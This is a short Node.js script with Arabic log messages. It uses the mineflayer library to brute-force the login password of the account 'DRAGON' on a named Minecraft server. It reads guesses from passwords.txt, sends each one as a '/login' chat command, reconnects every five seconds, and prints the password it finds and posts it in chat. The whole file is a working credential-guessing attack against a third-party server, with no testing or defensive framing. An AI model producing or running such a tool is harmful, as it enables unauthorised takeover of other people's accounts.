const mineflayer = require('mineflayer');
const fs = require('fs');

const server = process.env.MC_SERVER || 'empmc.xyz';
const port = parseInt(process.env.MC_PORT) || 19132;
const username = 'DRAGON';

const passwords = fs.readFileSync('passwords.txt', 'utf-8').split('\n');
let attempt = 0;

function tryLogin() {
  if (attempt >= passwords.length) {
    console.log('❌ انتهت المحاولات. لم يتم العثور على كلمة المرور.');
    return;
  }

  console.log(`🔄 محاولة الاتصال بالسيرفر... (المحاولة ${attempt + 1})`);

  const bot = mineflayer.createBot({
    host: server,
    port: port,
    username: username,
  });

  let loginAttempted = false;

  bot.once('spawn', () => {
    console.log(`🔐 تجربة كلمة المرور رقم ${attempt + 1}: ${passwords[attempt]}`);
    bot.chat(`/login ${passwords[attempt]}`);
    loginAttempted = true;
  });

  bot.on('chat', (usernameSender, message) => {
    if (message.includes('تم تسجيل الدخول بنجاح') || message.includes('Login successful')) {
      console.log('✅ تم العثور على كلمة السر:', passwords[attempt]);
      bot.chat(`تم العثور على كلمة السر: ${passwords[attempt]}`);
      bot.quit();
    } else if (message.includes('كلمة المرور خاطئة') || message.includes('Incorrect password')) {
      console.log('❌ كلمة المرور خاطئة.');
      bot.quit();
    }
  });

  bot.on('kicked', (reason) => {
    console.log('🚫 تم طرد البوت من السيرفر:', reason);
  });

  bot.on('error', (err) => {
    console.log('🚫 خطأ في الاتصال:', err.message);
  });

  bot.on('end', () => {
    if (loginAttempted) {
      attempt++;
    }
    console.log('🔁 إعادة المحاولة بعد 5 ثوانٍ...');
    setTimeout(tryLogin, 5000);
  });
}

tryLogin();
